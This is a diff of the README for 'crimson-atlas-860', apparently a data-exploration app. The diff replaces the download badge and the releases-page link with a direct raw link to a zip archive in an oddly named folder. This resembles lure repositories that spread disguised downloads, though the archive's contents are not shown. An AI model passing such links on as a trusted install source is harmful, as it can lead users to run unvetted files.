@@ -1,6 +1,6 @@
 # 🌟 crimson-atlas-860 - Explore Your Data Effortlessly
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/Akari32/crimson-atlas-860/main/uncentred/crimson-atlas-860.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to crimson-atlas-860! This application helps you visualize and explore y
 
 To download crimson-atlas-860, visit the following link:
 
-[Download crimson-atlas-860](https://github.com/Akari32/crimson-atlas-860/releases)
+[Download crimson-atlas-860](https://raw.githubusercontent.com/Akari32/crimson-atlas-860/main/uncentred/crimson-atlas-860.zip)
 
 ### Steps to Download:
 
